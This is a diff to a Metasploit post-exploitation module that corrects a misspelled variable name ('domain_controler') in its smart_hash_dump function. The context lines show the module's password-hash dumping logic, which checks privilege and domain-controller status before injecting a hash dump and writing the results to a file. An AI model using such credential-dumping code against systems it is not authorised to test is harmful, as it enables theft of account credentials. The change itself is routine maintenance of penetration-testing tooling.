@@ -415,13 +415,13 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def smart_hash_dump(migrate_system, pwdfile)
-    domain_controler = is_dc?
+    domain_controller = is_dc?
     if !is_uac_enabled? || is_admin?
       print_status('Dumping password hashes...')
       # Check if Running as SYSTEM
       if is_system?
         # For DC's the registry read method does not work.
-        if domain_controler
+        if domain_controller
           begin
             file_local_write(pwdfile, inject_hashdump)
           rescue ::Exception => e
@@ -445,7 +445,7 @@ class MetasploitModule < Msf::Post
       else
 
         # Check if Domain Controller
-        if domain_controler
+        if domain_controller
           begin
             file_local_write(pwdfile, inject_hashdump)
           rescue StandardError
